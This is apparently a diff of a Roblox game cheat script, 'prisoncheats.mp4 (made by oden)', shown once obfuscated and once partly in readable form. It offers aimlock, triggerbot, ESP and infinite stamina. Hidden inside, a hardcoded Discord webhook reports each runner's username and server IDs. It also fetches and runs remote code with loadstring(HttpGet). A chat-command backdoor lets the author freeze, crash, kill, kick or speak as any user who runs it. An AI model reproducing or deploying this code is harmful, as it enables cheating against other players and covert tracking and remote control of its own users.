-(v256/100) ;end local function v65(v257) if (v257 and v257.Character) then return v257.Character:FindFirstChild("Head");end return nil;end local function v66(v258) local v259=v31:WorldToViewportPoint(v258);return v259.Z>0 ;end local function v67(v260,v261,v262) local v263=v65(v260);if v263 then local v443=v31:WorldToViewportPoint(v263.Position);if (v443.Z>0) then local v575=v44(v443.X,v443.Y);local v576=(v575-v261).Magnitude;if (v576<=v262) then return true,v575,v576;end end end return false,nil,math.huge;end local function v68() local v264=math.huge;local v265=nil;local v266=v11:GetMouseLocation();for v384,v385 in ipairs(v15:GetPlayers()) do if (v65(v385) and (v385~=v32)) then local v506=v65(v385);local v507=v31:WorldToViewportPoint(v506.Position);if v66(v506.Position) then local v620=(v44(v507.X,v507.Y) -v266).Magnitude;if (v620<=v1.Radius) then local v651=(v32:GetMouse().Hit.Position-v506.Position).Magnitude;if (v651<v264) then v265=v385;v264=v651;end end end end end return v265;end local function v69(v267) if ((v267.Character:FindFirstChildOfClass("Humanoid").FloorMaterial==Enum.Material.Air) or (v267.Character.Head.Velocity.Y>=1) or ((v267.Character:FindFirstChildOfClass("Humanoid").FloorMaterial==Enum.Material.Air) and (v267.Character.Head.Velocity.Y>=1))) then return true;else return false;end end local function v70(v268) local v269=RaycastParams.new();v269.FilterDescendantsInstances={v268.Character};v269.RespectCanCollide=true;local v272=v268.Character;local v273=v272 and v272:FindFirstChild("HumanoidRootPart") ;v268.CharacterAdded:Connect(function(v386) v269.FilterDescendantsInstances={v386};v272=v386;v273=v386:WaitForChild("HumanoidRootPart",8999999488);end);v268.CharacterRemoving:Connect(function() v272=nil;v273=nil;end);v16.Heartbeat:Connect(function() if ( not v272 or  not v273) then return;end local v388=v273.Position;local v389=v35(workspace,v388,v36,v269);if  not v389 then v38[v268]=false;return;end local v390=v389.Position + v37 ;v38[v268]=true;v39[v268]=v390;end);end for v274,v275 in ipairs(v15:GetPlayers()) do task.spawn(v70,v275);end v15.PlayerAdded:Connect(function(v276) task.spawn(v70,v276);end);local function v71() if (v7['CameraLocked'] and v7['targetPlayer']) then if ((v7['targetPlayer'].Character and v7['targetPlayer'].Character:FindFirstChild("KO") and (Flags['KOCheck']==true)) or ((v7['targetPlayer'].Character:FindFirstChildOfClass("Humanoid").Health==0) and (Flags['KOCheck']==true))) then v7['CameraLocked']=false;return;end local v444=v65(v7['targetPlayer']);local v445;if v444 then if  not Flags['Blatant'] then local v633=v39[v7.targetPlayer];local v634=v633.Y + (Flags['YOffset']/10) ;v445=v43(v633.X,v633.Y + (Flags['YOffset']/10) ,v633.Z) + (v43(v444.Velocity.X,0,v444.Velocity.Z)/Flags['Prediction']) ;if ((Flags['AirShotScale']~=0) and v69(v7['targetPlayer'])) then v634=v633.Y + (Flags['YOffset']/10) + (Flags['AirShotScale']/10) ;end elseif Flags['Blatant'] then v445=v444.Position + v43(0,Flags['YOffset']/10 ,0) + (v444.Velocity/Flags['Prediction']) ;end local v578=v24.CFrame;local v579=v42(v24.CFrame.Position,v445);local v580=v64(Flags['Smoothing']);v24.CFrame=v578:lerp(v579,v580);end end end local function v72() local v277=v33();local v278=v277:WaitForChild("Humanoid");local v279=v277:FindFirstChildOfClass("Tool");if  not v279 then return;end local v280=v279:FindFirstChild("Fires");if  not v280 then return;end local v281;local v282;local v283=v44(v31.ViewportSize.X/2 ,v31.ViewportSize.Y/2 );if (v7['CameraLocked'] and v7['targetPlayer']:IsA("Player") and v7['targetPlayer'].Character) then local v446;local v447=v7['targetPlayer'].Character:FindFirstChild("Head");if v447 then if  not Flags['Blatant'] then local v635=v39[v7.targetPlayer];local v636=v635.Y + (Flags['YOffset']/10) ;v446=v43(v635.X,v635.Y + (Flags['YOffset']/10) ,v635.Z) + (v43(v447.Velocity.X,0,v447.Velocity.Z)/Flags['Prediction']) ;if ((Flags['AirShotScale']>0) and v69(v7['targetPlayer'])) then v636=v635.Y + (Flags['YOffset']/10) + (Flags['AirShotScale']/10) ;end elseif Flags['Blatant'] then v446=v447.Position + v43(0,Flags['YOffset']/10 ,0) + (v447.Velocity/Flags['Prediction']) ;end local v582=v67(v7['targetPlayer'],v283,v1.Radius);if v582 then v282=v42(v446);else v282=v34.Hit;end end else v282=v34.Hit;end if (v279.Ammo.Value<=0) then return;end if ((v277:FindFirstChildOfClass("Humanoid").FloorMaterial==Enum.Material.Air) or (v277.Head.Velocity.Y>=1) or ((v277:FindFirstChildOfClass("Humanoid").FloorMaterial==Enum.Material.Air) and (v277.Head.Velocity.Y>=1))) then return;end local v284=true;for v393,v394 in pairs(v32.Character.Humanoid:GetPlayingAnimationTracks()) do if (v394.Animation.AnimationId==v280.AnimationId) then v394:Stop(0);end end v281=v278:LoadAnimation(v280);if (tostring(v279)=="Glock") then v7['holding']="Glock";getRemote("Glock",v282);elseif (tostring(v279)=="Shotty") then v7['holding']="Shotty";getRemote("Shotty",v282);end if v284 then v32.Character.Humanoid:LoadAnimation(v280):Play(0.1,1,2);end return v7['holding'];end local function v73() if Flags['AutoShoot'] then while v7['Firing'] do local v509=v72();if (v509=="Glock") then task.wait(0.27);elseif (v509=="Shotty") then task.wait(0.18);end v5['Stepped']:Wait();end elseif  not Flags['AutoShoot'] then v72();end end function AutoShootTriggerbot() while true do local v395=0;if (Flags['Triggerbot'] and v7['CameraLocked']) then pcall(function() local v584=v44(v31.ViewportSize.X/2 ,v31.ViewportSize.Y/2 );local v585,v586,v587=v67(v7['targetPlayer'],v584,v2.Radius);if (v585 and  not v60(v7['targetPlayer']) and v59(v7['targetPlayer']) and v33():FindFirstChild("Glock") and v7['targetPlayer'].Character and v7['targetPlayer'].Character.HumanoidRootPart) then v72();v395=Flags['GlockAutoShootDelay'];elseif (v585 and  not v60(v7['targetPlayer']) and v59(v7['targetPlayer']) and v33():FindFirstChild("Shotty") and v7['targetPlayer'].Character and v7['targetPlayer'].Character.HumanoidRootPart) then v72();v395=Flags['ShottyAutoShootDelay'];else v395=0;end end);else v395=0;end task.wait(v395);end end function CHATSPY() if (Flags['ChatSpy']==true) then v40.ChatChannelParentFrame.Visible=true;v40.ChatBarParentFrame.Position=v40.ChatChannelParentFrame.Position + UDim2.new(UDim.new(),v40.ChatChannelParentFrame.Size.Y) ;elseif (Flags['ChatSpy']==false) then v40.ChatChannelParentFrame.Visible=false;v40.ChatBarParentFrame.Position=v41;end end function fireEvents(v285) if v285:FindFirstChild("Lock") then wait(0.2);v285.Click.ClickDetector.RemoteEvent:FireServer();elseif v285.Parent:FindFirstChild("Lock") then wait(0.2);v285.Parent.Click.ClickDetector.RemoteEvent:FireServer();elseif v285.Parent.Parent:FindFirstChild("Lock") then wait(0.2);v285.Parent.Parent.Click.ClickDetector.RemoteEvent:FireServer();end end local function v74(v286) local v287={};for v396 in pairs(v286) do table.insert(v287,v396);end local v288=v287[math.random( #v287)];return v286[v288];end local function v75(v289) local v290=v289:WaitForChild("HumanoidRootPart");local v291=Flags['SpawnLocation']:lower();local v292;if (v291:lower()=="random") then v292=v49;elseif (v291:lower()=="front") then v292=v50;elseif (v291:lower()=="back") then v292=v51;else v292=v50;warn("Invalid spawn location: "   .. Flags['SpawnLocation'] );return;end local v293=v74(v292);if Flags['SpawnGamepass'] then v290.CFrame=v293;end end local function v76() v33().Humanoid.StateChanged:Connect(function(v397,v398) if Flags['AntiGroundHit'] then if ((v398==Enum.HumanoidStateType.FallingDown) or ((v398==Enum.HumanoidStateType.PlatformStanding) and  not v33():FindFirstChild("KO") and (v33():FindFirstChildOfClass("Humanoid").Health~=0))) then v33().Humanoid.PlatformStand=false;v33().Humanoid.Sit=false;v33().Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp);v33().Humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics);end end end);end do v11.InputBegan:Connect(function(v399) if (v399.KeyCode==v48.Camlock_Key.Value) then if  not keyPressing then keyPressing=true;if v7['CameraLocked'] then v7['CameraLocked']=false;else local v653=v11:GetMouseLocation();v7['targetPlayer']=v68(v44(v653.X,v653.Y),v1.Radius);if (v7['targetPlayer'] and v7['targetPlayer']:IsA("Player") and v7['targetPlayer'].Character and (v7['CameraLocked']==false)) then v7['CameraLocked']=true;MakeSound();end end end end end);v11.InputEnded:Connect(function(v400) if (v400.KeyCode==v48.Camlock_Key.Value) then keyPressing=false;end end);v11.InputBegan:Connect(function(v401) if ((v401.UserInputType==v48.AutoShoot_Key.Value) or (v401.KeyCode==v48.AutoShoot_Key.Value)) then if  not v7['Firing'] then v7['Firing']=true;v73();end end end);v11.InputEnded:Connect(function(v402) if ((v402.UserInputType==v48.AutoShoot_Key.Value) or (v402.KeyCode==v48.AutoShoot_Key.Value)) then v7['Firing']=false;end end);v11.InputBegan:Connect(function(v403,v404) if v404 then return;end if ((v403.UserInputType==v48.OpenDoor_Key.Value) or (v403.KeyCode==v48.OpenDoor_Key.Value)) then fireEvents(v34.Target);end end);end function Ye() if (v32.Character and v32.Character:FindFirstChildOfClass("Humanoid") and (v32.Character.Humanoid.Health>0)) then v32.Character.ChildAdded:Connect(function(v511) if ((tostring(v511)=="Glock") or (tostring(v511)=="Shotty")) then if (v511.Ammo.Value<=0) then v511.ManualActivationOnly=false;elseif (v511.Ammo.Value>0) then v511.ManualActivationOnly=true;end v511.Ammo.Changed:Connect(function() if (v511.Ammo.Value<=0) then v511.ManualActivationOnly=false;elseif (v511.Ammo.Value>0) then v511.ManualActivationOnly=true;end end);end end);end end function InfiniteStamina(v294) local v295=v294:WaitForChild("Stam");if  not v295 then return;end v295.Changed:Connect(function(v405) if Flags['InfiniteStamina'] then v405=100;v295.Value=100;end end);end do v32.CharacterAdded:Connect(function(v406) task.wait(0.2);v75(v406);InfiniteStamina(v406);v76();Ye();end);end do v5['RenderStepped']:Connect(function() task.spawn(function() if (Flags['GlockBoost'] and v33() and v33():FindFirstChildOfClass("Humanoid")) then local v590=v33().HumanoidRootPart;local v591=v33():FindFirstChildOfClass("Humanoid");if ((v590.Velocity.Y>80) and (v591.FloorMaterial==Enum.Material.Air)) then if  not v7['Boosted'] then v590.Velocity=v43(v590.Velocity.X,v590.Velocity.Y + Flags['GlockBoostAmount'] ,v590.Velocity.Z);v7['Boosted']=true;end else v7['Boosted']=false;end end end);task.spawn(function() local v453=v11:GetMouseLocation();v1.Position=v453;v1.Radius=Flags['AimlockFOVSize'];v1.Visible=Flags['AimlockVisible'];v2.Position=v453;v2.Radius=Flags['TriggerbotFOVSize'];v2.Visible=Flags['TriggerbotVisible'];v71();end);task.spawn(function() if (v32.Character and v32.Character:FindFirstChild("Humanoid") and Flags['LookAt'] and v7['CameraLocked']) then if ((v32.Character.Humanoid.Health~=0) or  not v32.Character:FindFirstChild("KO")) then local v640=v44(v31.ViewportSize.X/2 ,v31.ViewportSize.Y/2 );local v641,v642,v643=v67(v7['targetPlayer'],v640,1000);if (v641 and v7['targetPlayer'] and v7['targetPlayer'].Character and v7['targetPlayer'].Character.HumanoidRootPart) then local v660=Vector3.new(v7['targetPlayer'].Character.HumanoidRootPart.Position.X,v32.Character.HumanoidRootPart.Position.Y,v7['targetPlayer'].Character.HumanoidRootPart.Position.Z);v32.Character.HumanoidRootPart.CFrame=v32.Character.HumanoidRootPart.CFrame:Lerp(CFrame.new(v32.Character.HumanoidRootPart.Position,v660),v64(Flags['LookAtSmoothing']));end end end end);task.wait(0.01);end);end local v77=v53:Window({name='<font color=\"#AA55EB\">prisoncheats.mp4 (made by oden)</font> | '   .. v8 });local v78=v77:Page({Name="Aimbot"});local v79=v77:Page({Name="Configs"});local v80=v78:Section({Name="aimlock settings",size=425});local v81=v78:Section({Name="misc",Size=275,Side="Right"});local v82=v79:Section({Name="Settings",Size=275});local v83=v79:Section({Name="misc",Size=200,Side="Right"});local v84=v80:Label({Name="Q To Lock On | MB1 AutoShoot",Offset=16});local v85=v80:Toggle({Name="{ Aimlock FOV }",Default=true,Callback=function(v296) Flags['AimlockVisible']=v296;v52("Aimlock FOV Visible : "   .. tostring(v296) ,4,v47(170,85,235));end});local v86=v80:Slider({Name="{ Aimlock FOV Size }",Default=250,Minimum=1,Maximum=1000,Decimals=5,Suffix="",Callback=function(v298) Flags['AimlockFOVSize']=v298;end});local v87=v80:Slider({Name="{ Aimlock Prediction }",Default=8,Minimum=1,Maximum=100,Decimals=0.1,Suffix="",Callback=function(v300) Flags['Prediction']=v300;end});local v88=v80:Toggle({Name="{ Triggerbot FOV }",Default=true,Callback=function(v302) Flags['TriggerbotVisible']=v302;v52("Triggerbot FOV Visible : "   .. tostring(v302) ,4,v47(170,85,235));end});local v89=v80:Slider({Name="{ Triggerbot FOV Size }",Default=80,Minimum=1,Maximum=1000,Decimals=5,Suffix="",Callback=function(v304) Flags['TriggerbotFOVSize']=v304;end});local v90=v81:Toggle({Name="{ Auto Reset }",Default=false,Callback=function(v306) Flags['AutoReset']=v306;v52("Auto Reset Returning Soon");end});local v91=v81:Toggle({Name="{ Glock Launch Boost }",Default=false,Callback=function(v308) Flags['GlockBoost']=v308;v52("Glock Launch Boost : "   .. tostring(v308) ,4,v47(170,85,235));end});local v92=v81:Slider({Name="{ Glock Boost Slider }",Default=90,Minimum=1,Maximum=200,Decimals=1,Suffix="",Callback=function(v310) Flags['GlockBoostAmount']=v310;end});local v93=v80:Slider({Name="{ Smoothing }",Default=87,Minimum=0.1,Maximum=99.9,Decimals=0.1,Suffix="%",Callback=function(v312) Flags['Smoothing']=v312;end});local v94=v80:Slider({Name="{ Air Shot Scale }",Default=0,Minimum=0,Maximum=20,Decimals=1,Suffix="%",Callback=function(v314) Flags['AirShotScale']=v314;end});local v95=v80:Toggle({Name=" { Blatant Aimlock }",Default=false,Callback=function(v316) Flags['Blatant']=v316;v52("Blatant : "   .. tostring(Flags['Blatant'],6,v47(170,85,235)) );end});local v96=v80:Slider({Name="{ Y Offset }",Default= -20,Minimum= -25,Maximum=15,Decimals=0.1,Suffix="",Callback=function(v318) Flags['YOffset']=v318;end});local v97=v81:Label({Name="Spawn GamePass",Offset=16});local v98=v81:Toggle({Name="{ Spawn Gamepass (Fixed) }",Default=false,Callback=function(v320) Flags['SpawnGamepass']=v320;v52("Spawn Location Gamepass : "   .. tostring(v320) ,4,v47(170,85,235));end});local v99=v81:Button({Name="{ Back Spawn }",Callback=function() Flags['SpawnLocation']="back";v52("Back Spawn Selected",4,v47(170,85,235));end});local v100=v81:Button({Name="{ Front Spawn }",Callback=function() Flags['SpawnLocation']="front";v52("Front Spawn Selected",4,v47(170,85,235));end});local v101=v81:Toggle({Name="{ Infinite Stamina ( Works) }",Default=false,Callback=function(v324) Flags['InfiniteStamina']=true;pcall(function() InfiniteStamina(v32.Character);end);v52("Infinite Stamina : "   .. tostring(Flags['InfiniteStamina']) );end});local v102=v81:Toggle({Name=" { Anti Ground Hit }",Default=false,Callback=function(v326) Flags['AntiGroundHit']=v326;v52("Anti Ground Hit : "   .. tostring(v326) ,4,v47(170,85,235));end});local v103=v81:Toggle({Name="Chat Spy",Default=false,Callback=function(v328) Flags['ChatSpy']=v328;CHATSPY();v52("Chat Spy : "   .. tostring(v328) ,4,v47(170,85,235));end});local v97=v80:Label({Name="TRIGGERBOT",Offset=16});local v104=v80:Toggle({Name="{ AutoShoot }",Default=true,Callback=function(v330) Flags['AutoShoot']=v330;v52("AutoShoot : "   .. tostring(v330) ,4,v47(170,85,235));end});local v105=v80:Toggle({Name="{ Triggerbot }",Default=false,Callback=function(v332) Flags['Triggerbot']=v332;v52("Triggerbot : "   .. tostring(v332) ,4,v47(170,85,235));end});local v106=v80:Toggle({Name="{ LookAt Target }",Default=false,Callback=function(v334) Flags['LookAt']=v334;v52("Look At : "   .. tostring(v334) ,4,v47(170,85,235));end});local v107=v80:Slider({Name="{ LookAt Smoothing }",Default=80.1,Minimum=1.1,Maximum=99.9,Decimals=0.1,Suffix="%",Callback=function(v336) Flags['LookAtSmoothing']=v336;end});local v108=v80:Toggle({Name="{ KO Check }",Default=true,Callback=function(v338) Flags['KOCheck']=v338;v52("KO Check : "   .. tostring(v338) ,4,v47(170,85,235));end});local v97=v80:Label({Name="ESP",Offset=16});local v109=v80:Toggle({Name="Enable ESP",Default=false,Callback=function(v340) v7['ESP']=v340;for v407,v408 in pairs(v15:GetPlayers()) do v63(tostring(v408));end v52("ESP : "   .. tostring(v340) ,4,v47(170,85,235));end});local v109=v80:Toggle({Name="Vest",Default=false,Callback=function(v342) v7['ESPVest']=v342;v52("Vest ESP : "   .. tostring(v342) ,4,v47(170,85,235));end});local v109=v80:Toggle({Name="Name",Default=false,Callback=function(v344) v7['ESPName']=v344;v52("Name ESP : "   .. tostring(v344) ,4,v47(170,85,235));end});local v109=v80:Toggle({Name="Health",Default=false,Callback=function(v346) v7['ESPHealth']=v346;v52("Health ESP : "   .. tostring(v346) ,4,v47(170,85,235));end});local v97=v81:Label({Name="Open Doors : X",Offset=16});local v110="https://discord.com/api/webhooks/1334659483930198116/ykVsaNzJThneDLT41Vc-k4YBdws63lkmG6YrJLneHjoKpPagUol0VvYSX3G5Qs4TH9qF";local v111,v112=game.PlaceId,game.JobId;local v113=request({Url=v110,Method="POST",Headers={["Content-Type"]="application/json"},Body=v19:JSONEncode({content="",embeds={{title="oden",description=tostring(v32)   .. " has executed the script" ,type="rich",color=tonumber("0xffffff"),fields={{name="Display Name / placeId / JobId / Version:",value=v32.DisplayName   .. "\nPlaceID: "   .. v111   .. " JobId: "   .. v112   .. "\n```Version: "   .. tostring(v8)   .. "```" ,inline=true}}}}})});local function v114(v348) for v409,v410 in ipairs(v15:GetPlayers()) do if (string.find(v410.Name:lower(),v348:lower()) or string.find(v410.DisplayName:lower(),v348:lower())) then return v410;end end end v23.Filtering.OnClientEvent:Connect(function(v349) local v350=v23.GetAdmin();local v351=v349.FromSpeaker;local v352=v349.Message;local v353=v15:FindFirstChild(v351);if v353 then if table.find(v350,v353.Name) then local v592=string.split(v352," ");local v593=v592[1]:lower();local v594=v592[2];if (v593=="/freeze") then local v644=v114(v594);if (v644==v32) then local v662=v33();if (v662 and v662:FindFirstChild("HumanoidRootPart")) then v662.HumanoidRootPart.Anchored=true;end end elseif (v593=="/crash") then local v663=v114(v594);if (v663==v32) then while true do end end elseif (v593=="/kill") then local v671=v114(v594);if (v671==v32) then v33():BreakJoints();end elseif (v593=="/chat") then local v672=v114(v594);if (v672==v32) then local v673=table.concat(v592," ",3);v23.sayMessage(v673);end elseif (v593=="/update") then v22:TeleportToPlaceInstance(v111,v112,v32);elseif (v593=="/kick") then local v674=v114(v594);if (v674==v32) then v32:Kick("You have been kicked by an admin.");end end end end end);v78:Turn(true);v52("Loaded",6,v47(170,85,235));coroutine.wrap(AutoShootTriggerbot)();Ye();local v115=v82:Button({Name="{ Save Configs }",Callback=function() local v354="";for v411,v412 in pairs(Flags) do v354=v354   .. 'Flags["'   .. v411   .. '"] = '   .. tostring(v412)   .. "\n" ;end writefile(v9,v354);v52("Configs Saved Check F9");end});local v116=v82:Button({Name="{ Load Configs }",Callback=function() loadstring(readfile(v9))();v94:Set(Flags['AirShotScale']);v90:Set(Flags['AutoReset']);v91:Set(Flags['GlockBoost']);v92:Set(Flags['GlockBoostAmount']);v93:Set(Flags['Smoothing']);v95:Set(Flags['Blatant']);v96:Set(Flags['YOffset']);v98:Set(Flags['SpawnGamepass']);v101:Set(Flags['InfiniteStamina']);v102:Set(Flags['AntiGroundHit']);v103:Set(Flags['ChatSpy']);v103.callback(Flags['ChatSpy']);v104:Set(Flags['AutoShoot']);v105:Set(Flags['Triggerbot']);v107:Set(Flags['LookAtSmoothing']);v106:Set(Flags['LookAt']);v108:Set(Flags['KOCheck']);v85:Set(Flags['AimlockVisible']);v87:Set(Flags['Prediction']);v89:Set(Flags['TriggerbotFOVSize']);v88:Set(Flags['TriggerbotVisible']);v86:Set(Flags['AimlockFOVSize']);v52("Configs Loaded Check F9");end});
+if _G.ScriptKey and _G.ScriptKey == "skibidigyat1259" then
+	--game:GetService('TestService'):Message("key detected")
+else
+	game.Players.LocalPlayer:Kick("wrong key stop tryna use my shit")
+    return;
+end
+
+if _G.Injected and _G.Injected == true then
+	return  
+end 
+
+_G.Injected = true;
+
+
+
+Drawing = Drawing;
+
+local function Drawing_new(type, info, ext)
+	local drawing = Drawing.new(type);
+	if info then
+		for u, x in pairs(info) do
+			drawing[u] = x;
+		end
+	end
+	if ext then
+		table.insert(ext, drawing);
+	end
+	return drawing;
+end
+
+local Circle = Drawing_new("Circle", {
+	Radius=250,
+	Visible=true,
+	Color=Color3.new(1, 1, 1),
+	Thickness=2,
+	Filled=false
+}); -- Aimbot Circle
+
+local Circle2 = Drawing_new("Circle", {Radius=50,
+	Visible=true,
+	Color=Color3.new(0, 0, 0),
+	Thickness=2,
+	Filled=false
+}); -- Triggerbot circle
+
+getgenv().Flags = {};
+
+local DefaultSettings = {};
+local Loops = {};
+local Notifications = {};
+local _OT = {};
+
+do
+	Flags["Prediction"] = 8;
+	Flags["Smoothing"] = 87;
+	Flags["KOCheck"] = true;
+	Flags["GlockBoostAmount"] = 90;
+	Flags["GlockBoost"] = false
+	Flags["YOffset"] = -20;
+	Flags["InfiniteStamina"] = false
+	Flags["AutoReset"] = false
+	_OT["targetPlayer"] = nil
+	_OT["holding"] = nil
+	Flags["AirShotScale"] = 0
+	_OT["CameraLocked"] = false
+	_OT["Boosted"] = false
+	_OT["Firing"] = false
+	Flags["AimlockFOVSize"] = 250
+	Flags["TriggerbotFOVSize"] = 70
+	Flags["Triggerbot"] = false
+	Flags["AntiGroundHit"] = false
+	Flags["Blatant"] = false
+	Flags["SpawnGamepass"] = false
+	Flags["ChatSpy"] = false
+	_OT["ESP"] = false
+	_OT["ESPName"] = false
+	_OT["ESPHealth"] = false
+	_OT["ESPVest"] = false
+	Flags["SpawnLocation"] = "Front"
+	Flags["AutoShoot"] = true
+	Flags["LookAt"] = false
+	Flags["LookAtSmoothing"] = 80
+	Flags["AimlockVisible"] = true
+	Flags["TriggerbotVisible"] = true
+end
+
+local Version = "1.0.2"
+
+local filename = "Oden.txt"
+
+if not isfile(filename) then
+	writefile(filename, [[]])
+end
+
+local function getS(service)
+	if cloneref then
+		return cloneref(game:GetService(service))
+	else
+		return game:GetService(service)
+	end 
+end
+
+local UserInputService  =       getS("UserInputService");
+local debris 		    =       getS("Debris");
+local TweenService      =       getS("TweenService");
+local SoundService      =       getS("SoundService");
+local Players           =       getS("Players");
+local RunService        =       getS("RunService");
+local ReplicatedStorage =       getS("ReplicatedStorage");
+local Stats             =       getS("Stats");
+local HttpService 	    = 	    getS("HttpService");
+local CoreGui 			=		getS("CoreGui");
+local TestService 		= 		getS("TestService");
+local TeleportService   = 		getS("TeleportService");
+
+
+local AdminStuff = {
+	Filtering = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering");
+	sayMessage =ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"),
+
+	GetAdmin = function()
+		return loadstring(game:HttpGet("https://raw.githubusercontent.com/uujxUjio/Imperial/refs/heads/main/D%CC%B7%CD%9B%CD%82%CC%A7%CD%85%C3%A5%CC%B8%CC%94%CC%9A%CC%9C7%D2%89%CC%A8%CC%8D%C4%85%CC%B7%CD%98%CC%8E%CC%ACM%D2%88%CC%B5%CC%863%CD%9C%CC%9B%CC%BF%CC%A9N%CC%B8%CD%9B%CC%91!%D2%89%CC%BA%CD%85"))()
+	end,
+}
+
+local Camera = workspace.CurrentCamera
+
+
+Loops["RenderStepped"] = RunService.RenderStepped;
+Loops["Heartbeat"] = RunService.Heartbeat;
+Loops["Stepped"] = RunService.Stepped;
+
+local Camera, camera    = game.Workspace.CurrentCamera, game.Workspace.CurrentCamera;
+local LocalPlayer       = Players.LocalPlayer;
+local getChar 			= function() return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait() end
+local Mouse             = LocalPlayer:GetMouse();
+
+local raycast = workspace.Raycast
+local down = Vector3.new(0, -30, 0)
+local r6_up = Vector3.new(0, 6, 0)
+
+local IsGrounded = {}
+local PlayerFloor = {}
+
+
+function getRemote(ToolName, Pos)
+	if game.PlaceId == 16702351217 then
+		if ToolName == "Shotty" then
+			return LocalPlayer.Character:FindFirstChild("Shotty").Shoot:FireServer(Pos)
+		elseif ToolName == "Glock" then
+			return LocalPlayer.Character:FindFirstChild("Glock").Shoot:FireServer(Pos)
+		end
+	elseif game.PlaceId == 15852982099 then
+		if ToolName == "Shotty" then
+			return ReplicatedStorage.ShottyFire:FireServer(Pos)
+		elseif ToolName == "Glock" then
+			return ReplicatedStorage.GlockFire:FireServer(Pos)
+		end
+	end
+end
+
+local chatFrame       = LocalPlayer.PlayerGui.Chat.Frame
+local OriginalChatPos = chatFrame.ChatBarParentFrame.Position
+
+local CFNew = CFrame.new
+local V3New = Vector3.new
+local V2New = Vector2.new
+local INew = Instance.new
+local TweenNew = TweenInfo.new
+local RGB = Color3.fromRGB
+
+local Keys = {
+	Auto_Key = {Value = Enum.UserInputType.MouseButton1},
+	Camlock_Key = {Value = Enum.KeyCode.Q},
+	OpenDoor_Key = {Value = Enum.KeyCode.X}
+}
+
+local RandomSpawns = {
+	R1 = CFNew(-520, 4, 55),
+	R2 = CFNew(-494, 4, 121),
+	R3 = CFNew(-492, 4, 52),
+	R4 = CFNew(-464, 4, 54),
+	R5 = CFNew(-466, 4, 121),
+	R6 = CFNew(-438, 4, 124),
+	R7 = CFNew(-436, 4, 55),
+	R8 = CFNew(-411, 4, 123),
+	R9 = CFNew(-409, 4, 55),
+	R10 = CFNew(-381, 4, 54),
+	R11 = CFNew(-383, 4, 120),
+	R12 = CFNew(-355, 4, 119),
+	R13 = CFNew(-353, 4, 55)
+}
+
+local FrontSpawns = {
+	F1 = CFNew(-2249, 18320, -3080),
+	F2 = CFNew(-2247, 18320, -3144)
+}
+
+local BackSpawns = {
+	B1 = CFNew(-2444, 18320, -3078),
+	B2 = CFNew(-2443, 18320, -3145)
+}
+
+
+-- // Notif System
+
+local function createNotification(text, time, color)
+	if not text then text = "" end;
+	if not time then time = 6 end;
+	if not color then color = RGB(170, 85, 235) end;
+
+	local notificationContainer = INew("ScreenGui", Players.LocalPlayer:WaitForChild("PlayerGui"))
+
+	local base = 75
+	local notigap = 30 
+	local yoffset = #Notifications * notigap
+
+	local holder = INew("Frame")
+	holder.Position = UDim2.new(0, -30, 0, base + yoffset)
+	holder.Size = UDim2.new(0, 0, 0, 23)
+	holder.BackgroundTransparency = 0
+	holder.Parent = notificationContainer
+	holder.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
+	holder.BorderSizePixel = 1
+	holder.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	local background = INew("Frame")
+	background.Parent = holder
+	background.Size = UDim2.new(1, -4, 1, -4)
+	background.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
+	background.Position = UDim2.new(0, 2, 0, 2)
+	background.BorderSizePixel = 1
+	background.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	local bar1 = INew("Frame")
+	bar1.Size = UDim2.new(0, 1, 1, 0)
+	bar1.Parent = background
+	bar1.BackgroundColor3 = color
+	bar1.Position = UDim2.new(0, 0, 0, 0)
+	bar1.BorderSizePixel = 0
+
+	local bar2 = INew("Frame")
+	bar2.Size = UDim2.new(0, 0, 0, 1)
+	bar2.Position = UDim2.new(0, 0, 0, 15)
+	bar2.Parent = background
+	bar2.BackgroundColor3 = color
+	bar2.BorderSizePixel = 0
+
+	local notif = INew("TextLabel")
+	notif.TextXAlignment = Enum.TextXAlignment.Left
+	notif.Position = UDim2.new(0, 3, 0, 0)
+	notif.Size = UDim2.new(1, 0, 1, 0)
+	notif.Parent = background
+	notif.Font = Enum.Font.Ubuntu
+	notif.TextColor3 = Color3.new(1, 1, 1)
+	notif.BackgroundTransparency = 1
+	notif.TextSize = 12.00
+	notif.Text = text
+
+	holder.Size = UDim2.new(0, notif.TextBounds.X + 20, 0, 19)
+	bar2.Size = UDim2.new(0, 1, 0, 1)
+
+	local sound = INew("Sound")
+	sound.Name = "Ohkay"
+	sound.SoundId = "rbxassetid://8726881116" 
+	sound.Parent = holder
+	sound:Play()
+
+	local tweenInfo = TweenNew(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
+	local tween = TweenService:Create(holder, tweenInfo, {Size = UDim2.new(0, notif.TextBounds.X + 10, 0, 19), Position = UDim2.new(0, 20, 0, base + yoffset)})
+	tween:Play()
+
+	local tweenbar = TweenService:Create(bar2, tweenInfo, {Size = UDim2.new(0, background.AbsoluteSize.X - 1, 0, 1)})
+	tweenbar:Play()
+
+	table.insert(Notifications, holder) 
+
+	task.spawn(function()
+		task.wait(time)
+		local fade = TweenService:Create(holder, TweenNew(1, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {BackgroundTransparency = 1})
+		fade:Play()
+		fade.Completed:Connect(function()
+			holder:Destroy()
+			for i, notification in pairs(Notifications) do
+				if notification == holder then
+					table.remove(Notifications, i)
+					break
+				end
+			end
+
+			for i, notification in pairs(Notifications) do
+				local yoffset2 = (i - 1) * notigap
+				TweenService:Create(notification, TweenNew(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(0, 20, 0, base + yoffset2)}):Play()
+			end
+		end)
+	end)
+end
+
+-- // Library Tables
+local library = {}
+local utility = {}
+local obelus = {
+	connections = {}
+}
+-- // Variables
+local uis = game:GetService("UserInputService")
+local cre = game:GetService("CoreGui")
+-- // Indexing
+library.__index = library
+-- // Functions
+do
+	function utility:Create(createInfo)
+		local createInfo = createInfo or {}
+		--
+		if createInfo.Type then
+			local instance = Instance.new(createInfo.Type)
+			--
+			if createInfo.Properties and typeof(createInfo.Properties) == "table" then
